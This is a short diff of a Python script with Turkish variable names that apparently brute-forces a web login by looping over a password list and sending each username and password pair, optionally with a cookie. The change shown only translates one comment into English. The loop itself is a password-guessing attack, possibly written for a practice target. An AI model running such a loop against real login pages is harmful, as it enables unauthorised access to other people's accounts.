@@ -11,7 +11,7 @@ def cozum(kullanici,url):
     for sifre in sifreler:
         sifre = sifre.strip()
         print('Trying: ' + sifre)
-        veri = {'username':kullanici,'password':sifre,'Login':'submit'} #login ve submit sayfada bir değer olamaz o yüzden ve bu değerler siteden siteye değişebilir.
+        veri = {'username':kullanici,'password':sifre,'Login':'submit'} #"login:submit" might be changeable in different sites.
             
         if cerez_adi != '':
             geri_donus = requests.get(url, params={'username':kullanici,'password':sifre,'Login':'Login'},cookies ={'Cookie':cerez_adi}) # bu değerler siteden siteye göre değişebilir.
